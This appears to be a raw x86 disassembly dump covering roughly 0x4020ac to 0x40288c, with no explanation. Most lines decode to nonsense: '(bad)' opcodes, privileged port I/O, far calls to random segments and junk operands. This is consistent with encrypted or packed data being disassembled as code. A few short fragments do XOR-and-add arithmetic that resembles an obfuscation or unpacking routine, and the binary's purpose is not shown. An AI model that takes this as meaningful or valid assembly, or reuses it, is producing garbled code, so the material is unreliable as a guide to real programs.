  4020ac:	into   
  4020ad:	scas   al,BYTE PTR es:[edi]
  4020ae:	pop    ss
  4020af:	pop    ss
  4020b0:	push   ebp
  4020b1:	(bad)  
  4020b2:	jns    0x40203e
  4020b4:	push   cs
  4020b5:	push   ds
  4020b6:	mov    ?,WORD PTR [ecx+0x73]
  4020b9:	jb     0x4020a6
  4020bb:	pop    es
  4020bc:	or     BYTE PTR [ebx],cl
  4020be:	and    eax,0x3bfc2f93
  4020c3:	mov    ds:0x3ec5bf55,eax
  4020c8:	sbb    WORD PTR [edx+0x20],ax
  4020cc:	cwde   
  4020cd:	(bad)  
  4020d0:	and    edx,ebx
  4020d2:	shl    BYTE PTR [esi+eax*8],0xf0
  4020d6:	xor    edi,ebx
  4020d8:	and    al,0xba
  4020da:	sub    BYTE PTR [edi*4-0x64efb536],bh
  4020e1:	(bad)  
  4020e2:	or     DWORD PTR [ecx],edx
  4020e4:	jne    0x402117
  4020e6:	(bad)  
  4020e7:	cli    
  4020e8:	mov    ah,dl
  4020ea:	dec    esi
  4020eb:	sbb    edx,ebp
  4020ed:	dec    ebp
  4020ee:	pinsrw mm3,WORD PTR [ebp-0x760642c2],0x8a
  4020f6:	outs   dx,DWORD PTR ds:[esi]
  4020f7:	sub    ebx,ebx
  4020f9:	mov    eax,0x81e271f2
  4020fe:	leave  
  4020ff:	rol    DWORD PTR [edx],cl
  402101:	pop    ebp
  402102:	jns    0x40212f
  402104:	cdq    
  402105:	sbb    eax,0x1ff87b0e
  40210a:	inc    eax
  40210b:	aaa    
  40210c:	dec    edx
  40210d:	daa    
  40210e:	inc    edi
  40210f:	add    eax,0x1c94dbd
  402114:	xor    dl,BYTE PTR [ecx-0x37e084b]
  40211a:	dec    ecx
  40211b:	dec    edx
  40211c:	pop    edi
  40211d:	loope  0x4020e0
  40211f:	lahf   
  402120:	cmp    DWORD PTR [esp+eax*4+0x2e],esp
  402124:	(bad)  
  402125:	jnp    0x402167
  402127:	jae    0x4021a6
  402129:	or     cl,BYTE PTR [esi]
  40212b:	and    DWORD PTR [esi-0x25851ea0],ebp
  402131:	adc    ch,BYTE PTR [eax-0x536fbe8b]
  402137:	xchg   DWORD PTR [edx-0x3551d9fa],esp
  40213d:	jmp    0x4020c7
  40213f:	xlat   BYTE PTR ds:[ebx]
  402140:	dec    ecx
  402141:	ret    0x9303
  402144:	mov    gs,WORD PTR [edi+edx*1]
  402147:	cmp    BYTE PTR [ebx+0x56],ch
  40214a:	cmp    DWORD PTR [ebx+0x40a560d],0x4e
  402151:	ins    DWORD PTR es:[edi],dx
  402152:	lea    ecx,[ecx-0x78d507e2]
  402158:	sahf   
  402159:	mov    WORD PTR [ecx-0x67],ss
  40215c:	mov    eax,0x4be1dc50
  402161:	or     DWORD PTR [eax+ecx*2-0x7bbe5cb4],ebp
  402168:	jl     0x402190
  40216a:	call   DWORD PTR [ecx-0x684f9d2f]
  402170:	cmp    DWORD PTR [edi],edx
  402172:	mov    ebp,0x3291c9fa
  402177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402178:	sub    ebx,ebp
  40217a:	pop    ss
  40217b:	xchg   DWORD PTR [ebx-0xdffce6b],esp
  402181:	ss loope 0x40218d
  402184:	popf   
  402185:	and    DWORD PTR [eax+0x6bd5f404],eax
  40218b:	sbb    BYTE PTR [esi-0x52cde5af],cl
  402191:	les    ebx,FWORD PTR [edx]
  402193:	push   ebp
  402194:	cmp    esp,0x1c
  402197:	(bad)  
  402198:	cmp    esi,DWORD PTR [eax]
  40219a:	cmp    DWORD PTR [edi+0x7b04674e],esi
  4021a0:	push   0xd584e49
  4021a5:	cmp    esi,esi
  4021a7:	dec    eax
  4021a8:	bound  ebp,QWORD PTR [ebx-0x5f]
  4021ab:	inc    edi
  4021ac:	loope  0x4021c2
  4021ae:	or     BYTE PTR [ebp-0x235fb6d5],al
  4021b4:	stos   BYTE PTR es:[edi],al
  4021b5:	retf   
  4021b6:	das    
  4021b7:	stos   DWORD PTR es:[edi],eax
  4021b8:	xor    eax,0x5cf9198f
  4021bd:	(bad)  [eax-0x2b]
  4021c0:	repnz pop DWORD PTR [ecx*1-0x24af581b]
  4021c8:	push   edx
  4021c9:	push   0x16469d68
  4021ce:	shr    DWORD PTR [ecx+ecx*4],cl
  4021d1:	mov    eax,0x6803ad82
  4021d6:	mov    eax,0x57ccb8cf
  4021db:	sub    dh,ah
  4021dd:	rol    BYTE PTR [edx-0x540c5159],0xa
  4021e4:	mov    bh,0x79
  4021e6:	lods   al,BYTE PTR ds:[esi]
  4021e7:	mov    al,0x4f
  4021e9:	push   cs
  4021ea:	(bad)  
  4021eb:	add    dl,dl
  4021ed:	outs   dx,BYTE PTR ds:[esi]
  4021ee:	push   es
  4021ef:	cmp    BYTE PTR [ebx-0x1a47d5f5],ah
  4021f5:	into   
  4021f6:	and    BYTE PTR [ecx-0x5bea8e22],cl
  4021fc:	mov    bl,0xbb
  4021fe:	dec    ebx
  4021ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402200:	aam    0xf9
  402202:	mov    ch,0x97
  402204:	fsub   QWORD PTR [ebx-0x6a7da4be]
  40220a:	inc    esi
  40220b:	pop    esi
  40220c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40220d:	leave  
  40220e:	dec    edi
  40220f:	aaa    
  402210:	xor    eax,0xf2b30ca6
  402215:	jecxz  0x402250
  402217:	cmp    DWORD PTR [esi],edi
  402219:	shr    DWORD PTR [edx+0x75],1
  40221c:	(bad)  
  40221d:	sbb    eax,0xbb89d66c
  402222:	jmp    0x92d50a0a
  402227:	xor    eax,0x799c2a94
  40222c:	push   esp
  40222d:	mov    ebp,0xaf2f3ebc
  402232:	push   esp
  402233:	jecxz  0x402273
  402235:	lock fld st(1)
  402238:	mov    bl,0x16
  40223a:	mov    bl,0xc0
  40223c:	jle    0x402234
  40223e:	add    ebp,DWORD PTR [edi+0x696b3299]
  402244:	dec    edi
  402245:	ins    BYTE PTR es:[edi],dx
  402246:	data16 or BYTE PTR [edi],ch
  402249:	and    edx,DWORD PTR [edi]
  40224b:	call   0x217b:0x7db14e51
  402252:	pop    ebp
  402253:	call   0x7cf0cc75
  402258:	loope  0x4021fd
  40225a:	mov    edi,DWORD PTR [ebp+0x7cc76408]
  402260:	loope  0x4022b1
  402262:	push   es
  402263:	mov    fs,WORD PTR [edx-0x1c7dc75a]
  402269:	out    dx,al
  40226a:	ret    0x652e
  40226d:	popa   
  40226e:	cmp    BYTE PTR [edi-0x78],al
  402271:	jl     0x4022c5
  402273:	sub    DWORD PTR ds:0xef569c48,edi
  402279:	mov    bh,0x79
  40227b:	mov    ecx,0x466ed43f
  402280:	aas    
  402281:	ret    
  402282:	push   ebx
  402284:	ins    BYTE PTR es:[edi],dx
  402285:	dec    eax
  402286:	xchg   esp,eax
  402287:	xor    al,0xe1
  402289:	mov    ebx,0x72b90fef
  40228e:	aad    0x75
  402290:	push   ebp
  402291:	xchg   ebp,edi
  402293:	mov    eax,0xd81726fd
  402298:	pop    esi
  402299:	pop    ebx
  40229a:	xor    al,0x8e
  40229c:	dec    edx
  40229d:	dec    esi
  40229e:	fld    TBYTE PTR [edi]
  4022a0:	xor    al,0xd5
  4022a2:	pop    ss
  4022a3:	inc    ebx
  4022a4:	(bad)  
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x2682c5b
  4022e1:	xor    edi,DWORD PTR [edx-0x39]
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x40230c
  4022ed:	stos   DWORD PTR es:[edi],eax
  4022ee:	aaa    
  4022ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f0:	aad    0x2f
  4022f2:	push   eax
  4022f3:	push   esp
  4022f4:	xor    esi,esp
  4022f6:	jne    0x40230a
  4022f8:	mov    esi,DWORD PTR [edi+0x24]
  4022fb:	add    al,BYTE PTR [edi+0x78]
  4022fe:	iret   
  4022ff:	fcmovbe st,st(2)
  402301:	mov    ecx,0xe1959b4b
  402306:	mov    ah,0xe4
  402308:	aas    
  402309:	out    0xc4,eax
  40230b:	dec    ecx
  40230c:	aas    
  40230d:	push   ecx
  40230e:	outs   dx,DWORD PTR ds:[esi]
  40230f:	stos   BYTE PTR es:[edi],al
  402310:	pop    edx
  402311:	push   edx
  402312:	(bad)  
  402313:	je     0x402358
  402315:	mov    esi,0xf05b90e2
  40231a:	sahf   
  40231b:	fninit 
  40231d:	push   eax
  40231e:	jnp    0x402324
  402320:	inc    esi
  402321:	xchg   ebx,eax
  402322:	in     al,0xb4
  402324:	sbb    ebx,0x3e19c691
  40232a:	xor    ch,BYTE PTR [esi+0x33f5e5b]
  402330:	test   dl,bl
  402332:	or     edi,DWORD PTR [esi]
  402334:	loope  0x4022f9
  402336:	dec    edi
  402337:	jle    0x4023ac
  402339:	adc    ch,BYTE PTR ss:[ebp-0x25e75b6e]
  402340:	mov    al,0x19
  402342:	aas    
  402343:	shr    DWORD PTR ss:[eax-0x1d],1
  402347:	or     al,BYTE PTR [ebp+0x4]
  40234a:	lea    edx,[eax]
  40234c:	leave  
  40234d:	popf   
  40234e:	scas   al,BYTE PTR es:[edi]
  40234f:	adc    ecx,DWORD PTR [ebx-0x2676eacd]
  402355:	sbb    al,0x44
  402357:	xor    DWORD PTR [esp+ebx*8],ebp
  40235a:	dec    ebx
  40235b:	mov    BYTE PTR [esi],dl
  40235d:	mov    bl,0x75
  40235f:	jne    0x402390
  402361:	dec    edi
  402362:	out    0x7,eax
  402364:	out    0x2d,al
  402366:	sub    cl,BYTE PTR [ecx-0x59]
  402369:	fistp  DWORD PTR [ecx+edi*8]
  40236c:	jno    0x4023e1
  40236e:	adc    esi,edx
  402370:	inc    ebx
  402371:	sahf   
  402372:	bound  esp,QWORD PTR [eax+0x18]
  402375:	call   0x4d958815
  40237a:	mov    edi,0xaf82405e
  40237f:	mov    edx,0xc49df8dc
  402384:	gs ds es xchg esi,eax
  402388:	mov    ebx,0xb57f857
  40238d:	out    0xa2,al
  40238f:	retf   
  402390:	scas   al,BYTE PTR es:[edi]
  402391:	aas    
  402392:	mov    edx,0x74195d05
  402397:	sub    al,0x33
  402399:	call   0xaf3b:0x226d3429
  4023a0:	sbb    BYTE PTR [ebx],al
  4023a2:	jne    0x402409
  4023a4:	or     dl,cl
  4023a6:	jnp    0x40235c
  4023a8:	push   ebp
  4023a9:	jecxz  0x4023b5
  4023ab:	and    eax,0x2c85ff88
  4023b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023b1:	lods   al,BYTE PTR ds:[esi]
  4023b2:	lock popf 
  4023b4:	fldcw  WORD PTR [ecx]
  4023b6:	pop    edx
  4023b7:	jb     0x40233a
  4023b9:	sub    al,0x4a
  4023bb:	and    ch,BYTE PTR [ebx+0x71]
  4023be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023bf:	adc    edx,DWORD PTR [edx-0x3b]
  4023c2:	inc    ebp
  4023c3:	scas   eax,DWORD PTR es:[edi]
  4023c4:	imul   esi,DWORD PTR [edi+0x2aa8dc9],0x9e7d0a15
  4023ce:	add    dh,BYTE PTR [esp+eax*1+0x2c7fd526]
  4023d5:	add    dh,dl
  4023d7:	xchg   DWORD PTR [edi+ecx*4],esi
  4023da:	mov    eax,ds:0x3fc73ff2
  4023df:	pop    ebp
  4023e0:	pop    esi
  4023e1:	inc    edi
  4023e2:	loope  0x4023f5
  4023e4:	(bad)  
  4023e5:	mov    esp,0x954a6738
  4023ea:	out    0xa1,eax
  4023ec:	mov    dl,0x83
  4023ee:	in     eax,dx
  4023ef:	dec    edx
  4023f0:	push   es
  4023f1:	hlt    
  4023f2:	sub    eax,edi
  4023f4:	in     al,dx
  4023f5:	push   ecx
  4023f6:	add    eax,eax
  4023f8:	jnp    0x40245c
  4023fa:	cmp    edx,esp
  4023fc:	push   0x77
  4023fe:	iret   
  4023ff:	in     al,0xdd
  402401:	push   ss
  402402:	pop    esp
  402403:	jle    0x402406
  402405:	mov    edx,0x537ead25
  40240a:	fisttp WORD PTR [eax-0x69]
  40240d:	jmp    0x71ae704
  402412:	call   0x59dd:0x7afb21fc
  402419:	and    ch,BYTE PTR [esi+ebx*2-0x3613f3ef]
  402420:	add    al,0xf4
  402422:	lods   eax,DWORD PTR ds:[esi]
  402423:	cdq    
  402424:	ja     0x402434
  402426:	add    DWORD PTR [eax-0x70a8a844],eax
  40242c:	cmp    ebp,DWORD PTR [esi+0x30b09793]
  402432:	mov    al,0x58
  402434:	int    0xad
  402436:	mov    ebp,0xfbb33a95
  40243b:	fisub  DWORD PTR [eax+0x7cc65a44]
  402441:	xor    eax,DWORD PTR ds:0x9e93a64f
  402447:	jmp    0x4023e8
  402449:	call   0x3ee:0x8d80fcc6
  402450:	inc    ebx
  402451:	mov    al,ds:0x9d55cc84
  402456:	mov    edi,0xe4fe14a6
  40245b:	pop    edx
  40245c:	cwde   
  40245d:	xor    ch,BYTE PTR [esi-0x9a1e4a7]
  402463:	cmovno edx,ebp
  402466:	cwde   
  402467:	cld    
  402468:	cwde   
  402469:	cdq    
  40246a:	das    
  40246b:	dec    ebx
  40246c:	pusha  
  40246d:	push   esi
  40246e:	arpl   cx,si
  402470:	bound  ebp,QWORD PTR [edi-0x6369aac]
  402476:	cs leave 
  402478:	pop    esi
  402479:	sub    DWORD PTR [edx],edi
  40247b:	(bad)  
  40247c:	out    0x92,eax
  40247e:	jbe    0x40244a
  402480:	add    al,0x5d
  402482:	js     0x402427
  402484:	mov    dh,0xda
  402486:	cld    
  402487:	push   0x15efa4a1
  40248c:	add    eax,0xea5df165
  402491:	jo     0x402422
  402493:	popa   
  402494:	dec    ebp
  402495:	aaa    
  402496:	mov    fs,WORD PTR [eax-0x5a]
  402499:	shr    DWORD PTR [eax+0x6f469395],1
  40249f:	mov    ebp,0x7adfef86
  4024a4:	mov    ecx,0x774a6c1c
  4024a9:	sub    eax,0x2e6beb15
  4024ae:	retf   
  4024af:	mov    eax,0x125aeff6
  4024b4:	cmp    esi,ebp
  4024b6:	cli    
  4024b7:	cwde   
  4024b8:	push   ecx
  4024b9:	inc    eax
  4024ba:	xchg   BYTE PTR [ebx+0x2789d865],ch
  4024c0:	test   eax,0x9fc7f034
  4024c5:	(bad)  
  4024c7:	dec    ebx
  4024c8:	inc    esp
  4024c9:	outs   dx,DWORD PTR ds:[esi]
  4024ca:	sbb    BYTE PTR [edi],dh
  4024cc:	inc    esi
  4024cd:	push   ds
  4024ce:	sbb    bl,dl
  4024d0:	(bad)  
  4024d1:	neg    DWORD PTR [eax+0x64a26b7f]
  4024d7:	in     eax,0xf8
  4024d9:	push   ebx
  4024da:	sbb    al,0xb4
  4024dc:	xor    eax,0x6b2c4a50
  4024e1:	and    al,0xb
  4024e3:	inc    ecx
  4024e4:	ins    BYTE PTR es:[edi],dx
  4024e5:	sar    DWORD PTR [edx*8+0x8d9edbb],0x67
  4024ed:	rcr    DWORD PTR [esi+0x43ff5f7f],1
  4024f3:	scas   al,BYTE PTR es:[edi]
  4024f4:	inc    eax
  4024f5:	test   DWORD PTR [edi-0x17],esp
  4024f8:	push   eax
  4024f9:	into   
  4024fa:	adc    al,0x41
  4024fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024fd:	fmul   st(0),st
  4024ff:	inc    esp
  402500:	jmp    0x8f8faf38
  402505:	inc    ecx
  402506:	adc    eax,0x2ef724ed
  40250b:	(bad)  
  40250d:	sahf   
  40250e:	jle    0x402555
  402510:	fmul   st(2),st
  402512:	jmp    0x4024c2
  402514:	dec    ebp
  402515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402516:	lods   al,BYTE PTR ds:[esi]
  402517:	fwait
  402518:	cmp    DWORD PTR [ecx+0x59],0x7caabd5d
  40251f:	mov    ecx,0x7eb63935
  402524:	(bad)  
  402525:	lods   al,BYTE PTR ds:[esi]
  402526:	push   es
  402527:	jns    0x402538
  402529:	inc    eax
  40252a:	ficom  DWORD PTR [edx]
  40252c:	mov    ds:0x3b084aab,eax
  402531:	push   ecx
  402532:	and    DWORD PTR [ecx],eax
  402534:	push   eax
  402535:	pop    edx
  402536:	aam    0x51
  402538:	gs gs push ebx
  40253b:	sub    eax,0x7edc281e
  402540:	pop    ebp
  402541:	ret    
  402542:	lds    edi,FWORD PTR [ebp+0x76]
  402545:	fiadd  WORD PTR [edi+0x22]
  402548:	xlat   BYTE PTR ds:[ebx]
  402549:	cmp    eax,0x978eed50
  40254e:	dec    esp
  40254f:	cwde   
  402550:	es jnp 0x402505
  402553:	leave  
  402554:	add    DWORD PTR [ebx+0x47749733],esi
  40255a:	pop    ebx
  40255b:	and    DWORD PTR [edx-0x7b],esp
  40255e:	fidivr DWORD PTR [esp]
  402561:	fwait
  402562:	adc    edi,DWORD PTR [edx-0x19]
  402565:	cdq    
  402566:	pop    eax
  402567:	fdivr  st(2),st
  402569:	jmp    0x139:0x4ff91f51
  402570:	jne    0x402832
  402576:	mov    eax,DWORD PTR [ebp+0x8]
  402579:	mov    ecx,DWORD PTR [ebp-0x10]
  40257c:	xor    eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	add    al,0x21
  402595:	pop    edx
  402596:	ins    DWORD PTR es:[edi],dx
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x402572
  4025a0:	loop   0x402543
  4025a2:	xchg   ah,dh
  4025a4:	sub    DWORD PTR [edx],ebx
  4025a6:	dec    edx
  4025a7:	and    cl,bl
  4025a9:	push   eax
  4025aa:	pop    ss
  4025ab:	and    bh,BYTE PTR [eax+0x31]
  4025ae:	fsubp  st(6),st
  4025b0:	jle    0x40262c
  4025b2:	repz div BYTE PTR [edi]
  4025b5:	test   eax,0x2033dde9
  4025ba:	push   ss
  4025bb:	std    
  4025bc:	mov    esp,0x72eea3ed
  4025c1:	add    cl,bh
  4025c3:	bound  edx,QWORD PTR fs:[esi+0x3e23928d]
  4025ca:	sar    DWORD PTR [esi-0x28e60454],cl
  4025d0:	lods   eax,DWORD PTR ds:[esi]
  4025d1:	mov    ds:0xeafdfd72,al
  4025d6:	cmp    DWORD PTR [edi+eiz*1-0x58d61263],edx
  4025dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025de:	jne    0x4025da
  4025e0:	lods   al,BYTE PTR ds:[esi]
  4025e1:	leave  
  4025e2:	popf   
  4025e3:	add    al,0x13
  4025e5:	xlat   BYTE PTR ds:[ebx]
  4025e6:	out    dx,eax
  4025e7:	arpl   WORD PTR [ecx-0x28],ax
  4025ea:	add    ebp,eax
  4025ec:	and    eax,0x6bf3dc37
  4025f1:	mov    ecx,0x3bbda103
  4025f6:	repz lea esp,[ebx]
  4025f9:	lahf   
  4025fa:	call   ebx
  4025fc:	sahf   
  4025fd:	lods   eax,DWORD PTR ds:[esi]
  4025fe:	mov    eax,ds:0xf9009547
  402603:	sbb    dh,ch
  402605:	sub    BYTE PTR [edi],dl
  402607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402608:	rol    BYTE PTR [esi+0x17],0xdb
  40260c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40260d:	dec    edi
  40260e:	in     eax,dx
  40260f:	cld    
  402610:	call   0x2832:0x481463bc
  402617:	fidivr DWORD PTR [ebp-0x23]
  40261a:	leave  
  40261b:	jnp    0x4025d1
  40261d:	ja     0x4025f5
  40261f:	outs   dx,DWORD PTR ds:[esi]
  402620:	mov    ds:0x1b2f0fed,eax
  402625:	adc    al,0xc2
  402627:	(bad)  
  402628:	pop    ss
  402629:	xlat   BYTE PTR ds:[ebx]
  40262a:	pop    esp
  40262b:	in     eax,dx
  40262c:	cmp    BYTE PTR [ecx-0x80],dl
  40262f:	pop    ebx
  402630:	sahf   
  402631:	ins    DWORD PTR es:[edi],dx
  402632:	data16 jnp 0x4025b5
  402635:	fdiv   DWORD PTR [ebx+0x149386b8]
  40263b:	jns    0x40269a
  40263d:	(bad)  
  40263e:	jmp    0xa89b19bf
  402643:	aam    0xf3
  402645:	repnz mov ch,BYTE PTR [ebx]
  402648:	scas   al,BYTE PTR es:[edi]
  402649:	fnstcw WORD PTR cs:[esi]
  40264c:	inc    ebx
  40264d:	iret   
  40264e:	ins    DWORD PTR es:[edi],dx
  40264f:	xchg   esi,eax
  402650:	lods   eax,DWORD PTR ds:[esi]
  402651:	fndisi(8087 only) 
  402653:	jno    0x402665
  402655:	jecxz  0x4025f3
  402657:	add    ebp,DWORD PTR [eax]
  402659:	push   0x14649304
  40265e:	pop    es
  40265f:	out    dx,al
  402660:	sub    bh,BYTE PTR [ebp+0x15]
  402663:	adc    bh,bh
  402665:	jne    0x402628
  402667:	inc    esi
  402668:	aam    0x4
  40266a:	mov    ds:0xdd41dd89,eax
  40266f:	and    BYTE PTR [edx+0x48c1a6de],bh
  402675:	mov    ebx,0xfecba6e5
  40267a:	ins    BYTE PTR es:[edi],dx
  40267b:	dec    ebp
  40267c:	and    DWORD PTR [edi],ecx
  40267e:	mov    ds:0x36f1387,al
  402683:	(bad)  
  402684:	test   bl,0xaf
  402687:	call   0xf89f4f27
  40268c:	nop
  40268d:	push   0xc93e6217
  402692:	mov    dl,0xac
  402694:	dec    eax
  402695:	inc    eax
  402696:	(bad)  [ecx+0x31e290ff]
  40269c:	fild   DWORD PTR [ecx+0x56bde91f]
  4026a2:	call   0x5f37f1c9
  4026a7:	jmp    0x402699
  4026a9:	xlat   BYTE PTR ds:[ebx]
  4026aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026ab:	and    ebp,DWORD PTR [edx+0x1e]
  4026ae:	push   ebp
  4026af:	int3   
  4026b0:	cmp    DWORD PTR [edx-0x3f2b430c],ebp
  4026b6:	jae    0x40267a
  4026b8:	mov    bl,0xf5
  4026ba:	daa    
  4026bb:	inc    esp
  4026bc:	push   edx
  4026bd:	dec    esi
  4026be:	inc    eax
  4026bf:	cwde   
  4026c0:	dec    esi
  4026c1:	push   esi
  4026c2:	or     edi,esp
  4026c4:	jecxz  0x4026ea
  4026c6:	fistp  DWORD PTR [ecx]
  4026c8:	adc    al,0xbb
  4026ca:	stos   DWORD PTR es:[edi],eax
  4026cb:	ror    BYTE PTR [ebx],1
  4026cd:	fld    TBYTE PTR [ecx]
  4026cf:	dec    esp
  4026d0:	dec    edi
  4026d1:	sub    esi,esi
  4026d3:	enter  0x46f4,0xb2
  4026d7:	inc    ecx
  4026d8:	nop
  4026d9:	adc    al,0xfc
  4026db:	xchg   ecx,eax
  4026dc:	lods   eax,DWORD PTR ds:[esi]
  4026dd:	loopne 0x402742
  4026df:	sbb    dl,BYTE PTR [edx+0x5f]
  4026e2:	arpl   WORD PTR [ecx-0x41],di
  4026e5:	and    DWORD PTR [edi+0x0],0xffffffda
  4026e9:	(bad)  
  4026eb:	(bad)  
  4026ec:	and    bl,BYTE PTR [eax-0x4e373a27]
  4026f2:	fnsave [esi-0x69]
  4026f5:	mov    ch,0x9
  4026f7:	jne    0x4026dc
  4026f9:	sbb    DWORD PTR [esi+0x70],0x73
  4026fd:	mov    DWORD PTR [ecx-0x2c380942],edx
  402703:	jecxz  0x402697
  402705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402706:	pop    DWORD PTR [edx+0x37]
  402709:	sub    dl,BYTE PTR [edx+0x4d]
  40270c:	sbb    eax,0x9cbb465b
  402711:	lods   al,BYTE PTR ds:[esi]
  402712:	icebp  
  402713:	jbe    0x40273b
  402715:	hlt    
  402716:	push   sp
  402718:	mov    ds:0xd67e383d,al
  40271d:	data16 jp 0x402707
  402720:	sbb    cl,bh
  402722:	mov    dh,0x3d
  402724:	jg     0x402785
  402726:	or     DWORD PTR [ebx+0x7989445b],esp
  40272c:	jge    0x4026c2
  40272e:	scas   al,BYTE PTR es:[edi]
  40272f:	cmp    eax,0x5196b6d0
  402734:	xchg   BYTE PTR [esi+0x5b],dh
  402737:	or     BYTE PTR [ebx],0x26
  40273a:	cdq    
  40273b:	call   0xa134:0x3cae02b0
  402742:	mov    bh,0x47
  402744:	ins    BYTE PTR es:[edi],dx
  402745:	lahf   
  402746:	clc    
  402747:	mov    ds:0xf0f33,al
  40274c:	pop    edx
  40274d:	test   DWORD PTR [ebp+0x3e],esi
  402750:	pop    ss
  402751:	push   ebx
  402752:	push   ds
  402753:	and    BYTE PTR [edx],dl
  402755:	repnz inc eax
  402757:	or     DWORD PTR [ebx-0x41],ebp
  40275a:	adc    cl,BYTE PTR [esi+0x7cb4ecb7]
  402760:	and    eax,DWORD PTR [ebx-0x65]
  402763:	or     BYTE PTR [ebx+ebp*8-0x7fd32353],dh
  40276a:	sub    ebx,edx
  40276c:	inc    ebp
  40276d:	cmp    eax,0xb2d93bc5
  402772:	jne    0x40271c
  402774:	outs   dx,BYTE PTR ds:[esi]
  402775:	je     0x402756
  402777:	dec    edx
  402778:	fadd   DWORD PTR [esi+0x4fe761e1]
  40277e:	and    bl,dh
  402780:	test   eax,0x59d86ddb
  402785:	scas   al,BYTE PTR es:[edi]
  402786:	fcmovb st,st(2)
  402788:	adc    eax,0xee9f442f
  40278d:	jo     0x4027dd
  40278f:	mov    ecx,0xe9ad2024
  402794:	adc    eax,0x82c087e1
  402799:	dec    edi
  40279a:	and    eax,0x11931c62
  40279f:	jno    0x40280b
  4027a1:	adc    ebx,esp
  4027a3:	jg     0x402731
  4027a5:	dec    edi
  4027a6:	inc    ebp
  4027a7:	pop    ebx
  4027a8:	add    BYTE PTR [eax],bh
  4027aa:	je     0x40281b
  4027ac:	mov    ebp,0x86421650
  4027b1:	ins    DWORD PTR es:[edi],dx
  4027b2:	aad    0x75
  4027b4:	mov    al,ds:0xf93da0e3
  4027b9:	and    eax,DWORD PTR [ebp-0x265520fb]
  4027bf:	add    BYTE PTR [eax],bh
  4027c1:	cmp    DWORD PTR [eax],ebx
  4027c3:	mov    ss,ecx
  4027c5:	mov    ds:0x96091657,al
  4027ca:	ins    DWORD PTR es:[edi],dx
  4027cb:	into   
  4027cc:	xor    ecx,DWORD PTR [edx+0x27]
  4027cf:	xchg   ebp,eax
  4027d0:	fmul   DWORD PTR [eax+0x4c]
  4027d3:	jno    0x402841
  4027d5:	dec    ebx
  4027d6:	and    BYTE PTR [ebx],0x66
  4027d9:	add    esi,ebp
  4027db:	test   eax,0xda7353e9
  4027e0:	lds    edx,FWORD PTR [eax+0x37780cf1]
  4027e6:	test   edi,esi
  4027e8:	sahf   
  4027e9:	ds js  0x402862
  4027ec:	outs   dx,DWORD PTR ds:[esi]
  4027ed:	mov    ds:0x48b4bf71,al
  4027f2:	or     BYTE PTR [ecx+0x21],dl
  4027f5:	mov    eax,0x18241008
  4027fa:	add    DWORD PTR [esi],esp
  4027fc:	sub    BYTE PTR [ecx-0x7c],ah
  4027ff:	add    cl,al
  402801:	jl     0x40284c
  402803:	call   0x899221c8
  402808:	inc    eax
  402809:	adc    BYTE PTR [eax+0x5f],0x7a
  40280d:	cld    
  40280e:	mov    edi,0x69609d40
  402813:	add    BYTE PTR [ecx-0x43],0x85
  402817:	fiadd  DWORD PTR ds:0x2b7ab1e0
  40281d:	adc    BYTE PTR [edi],al
  40281f:	sub    al,0xcd
  402821:	mov    eax,DWORD PTR [ebp-0x10]
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	or     ch,0xcf
  402884:	or     ecx,DWORD PTR [eax]
  402886:	or     al,0x78
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x402869
